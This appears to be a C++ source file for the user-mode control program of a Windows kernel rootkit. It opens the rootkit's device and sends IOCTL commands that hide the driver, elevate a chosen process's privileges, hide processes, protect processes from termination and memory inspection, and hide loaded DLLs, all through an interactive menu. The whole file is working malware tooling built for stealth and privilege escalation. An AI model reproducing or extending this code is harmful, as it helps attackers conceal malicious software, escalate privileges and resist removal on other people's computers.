#include <iostream>
#include <Windows.h>

namespace Rootkit {
    namespace codes {
        // CTL Codes to communicate with User Mode application.
        constexpr ULONG HideDriver =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x696, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ElevateProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x697, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x698, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x699, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG HideDLL =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x700, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG UnProtectProcess =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x701, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
        constexpr ULONG ProtectProcessOP =
            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x702, METHOD_BUFFERED, FILE_SPECIAL_ACCESS);
    }
    struct Request {
        HANDLE process_id;
        WCHAR DLLName[256];
    };


    bool HideTheDriver(HANDLE driver_handle) {
        DWORD bytes_returned = 0;
        // Properly declare all parameters for DeviceIoControl
        return DeviceIoControl(
            driver_handle,                // Handle to device
            codes::HideDriver,            // Control code
            nullptr,                      // Input buffer
            0,                           // Input buffer size
            nullptr,                      // Output buffer
            0,                           // Output buffer size
            &bytes_returned,             // Bytes returned
            nullptr                      // Overlapped
        );

    }

    bool ProtectProcessOP(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = UlongToHandle(pid);
        return DeviceIoControl(
            driver_handle,
            codes::ProtectProcessOP,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool UnProtectProcess(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = ULongToHandle(pid);
        // protecc
        return DeviceIoControl(
            driver_handle,
            codes::UnProtectProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool HideDLL(HANDLE driver_handle, DWORD pid, WCHAR* DLLName) {
        Request r;
        r.process_id = UlongToHandle(pid);
        wcsncpy_s(r.DLLName, DLLName, _TRUNCATE); // Safely copy the DLLName into r.DLLName

        return DeviceIoControl(
            driver_handle,
            codes::HideDLL,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool ElevateProcess(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = ULongToHandle(pid);


        return DeviceIoControl(
            driver_handle,
            codes::ElevateProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool ProtectProcess(HANDLE driver_handle, DWORD pid) {
        Request r;
        r.process_id = ULongToHandle(pid);
        // protecc
        return DeviceIoControl(
            driver_handle,
            codes::ProtectProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }

    bool HideProcess(HANDLE driver_handle, DWORD pid) {
        // Use our structure
        Request r;
        // Convert the DWORD to a HANDLE
        r.process_id = ULongToHandle(pid);
        // Send.
        return DeviceIoControl(
            driver_handle,
            codes::HideProcess,
            &r,
            sizeof(r),
            &r,
            sizeof(r),
            nullptr,
            nullptr
        );
    }
}

void showMenu() {
    std::cout << "===== User Mode Menu =====\n";
    std::cout << "1. Hide Driver\n";
    std::cout << "2. Elevate Process\n";
    std::cout << "3. Hide Process\n";
    std::cout << "4. Protect Process\n";
    std::cout << "5. Hide DLL from process.\n";
    std::cout << "99. Exit\n";
    std::cout << "=======================\n";
    std::cout << "Enter your choice: ";
}

int main() {
    std::cout << "Starting user mode program...\n";

    // Request more comprehensive access rights
    const HANDLE driver_handle = CreateFile(
        L"\\\\.\\rootkit",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        nullptr,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        nullptr
    );

    if (driver_handle == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        std::cout << "Failed to create driver handle. Error code: " << error << std::endl;
        switch (error) {
        case ERROR_ACCESS_DENIED:
            std::cout << "Access denied. Try running as Administrator.\n";
            break;
        case ERROR_FILE_NOT_FOUND:
            std::cout << "Driver device not found. Ensure driver is loaded. (Try to run as admin anyway, worked for me the last time.)\n";
            break;
        default:
            std::cout << "Unknown error occurred.\n";
        }
        return 1;
    }

    std::cout << "Got a driver handle!\n";

    // Move all variable declarations here before the switch
    int choice;
    int pid;
    int pidHide;
    int pidProtect;
    int pidDLLHide;
    int choiceProtect;
    bool enabled = true;
    WCHAR DLLName[256];
    std::wstring tempDLLName;

    while (true) {
        showMenu();
        std::cin >> choice;

        switch (choice) {
        case 1: {
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::HideTheDriver(driver_handle);
            Sleep(2000);
            system("cls");
            break;
        }
        case 2: {
            std::cout << "Enter a PID: ";
            std::cin >> pid;
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::ElevateProcess(driver_handle, pid);
            Sleep(2000);
            system("cls");
            break;
        }
        case 3: {
            std::cout << "Enter a PID: ";
            std::cin >> pidHide;
            std::cout << "[!] Sending Message to Driver.\n";
            Rootkit::HideProcess(driver_handle, pidHide);
            Sleep(2000);
            system("cls");
            break;
        }
        case 4: {
            while (enabled) {
                system("cls");
                std::cout << "===== Process Protection Menu =====\n";
                std::cout << "1. Protect a Process.\n";
                std::cout << "2. UnProtect a Process.\n";
                std::cout << "3. Protect a Process without causing a BSOD. (For Explanation Input 99.)\n";
                std::cout << "=======================\n";
                std::cout << "Enter a choice: ";
                std::cin >> choiceProtect;
                switch (choiceProtect) {
                case 1:
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    std::cout << "[!] Sending Message to Driver.\n";
                    Rootkit::ProtectProcess(driver_handle, pidProtect);
                    enabled = false;
                    break;
                case 2:
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    std::cout << "[!] Sending Message to Driver.\n";
                    Rootkit::UnProtectProcess(driver_handle, pidProtect);
                    enabled = false;
                    break;
                case 3:
                    std::cout << "Enter a PID: ";
                    std::cin >> pidProtect;
                    std::cout << "[!] Sending Message to Driver.\n";
                    Rootkit::ProtectProcessOP(driver_handle, pidProtect);
                    enabled = false;
                    break;
                case 99:
                    system("cls");
                    std::cout << "Protecting a process this way will cause an access denied on termination, and also will protect from viewing the memory of the process or writing to it.\n\n";
                    std::cout << "Returning to Main Menu in 10 seconds...\n";
                    Sleep(10000);
                    system("cls");
                    break;
                default:
                    std::cout << "Invalid Choice. Exiting Program...\n";
                    CloseHandle(driver_handle);
                    return 1;
                }
                break;
            }
            break;
        }
        case 5: {
            std::wcin.ignore(); // Clear any leftover input in the stream
            std::wcout << L"Enter a PID: ";
            std::cin >> pidDLLHide;
            std::wcout << L"\nEnter the DLL name you wish to hide (e.g., example.dll): ";
            std::wcin >> tempDLLName;
            // Check and append .dll if missing
            if (tempDLLName.length() < 4 || tempDLLName.substr(tempDLLName.length() - 4) != L".dll") {
                tempDLLName += L".dll";
            }
            wcsncpy_s(DLLName, tempDLLName.c_str(), _TRUNCATE);
            std::wcout << L"[!] Sending Message to Driver.\n";
            Rootkit::HideDLL(driver_handle, pidDLLHide, DLLName);
            Sleep(2000);
            system("cls");
            break;
        }
        case 99: {
            std::cout << "Exiting the program, bye!\n";
            CloseHandle(driver_handle);
            return 0;
        }
        default: {
            std::cout << "Invalid Choice.\n";
            Sleep(2000);
            system("cls");
            break;
        }
               Sleep(2000);
               system("cls");
        }
    }
}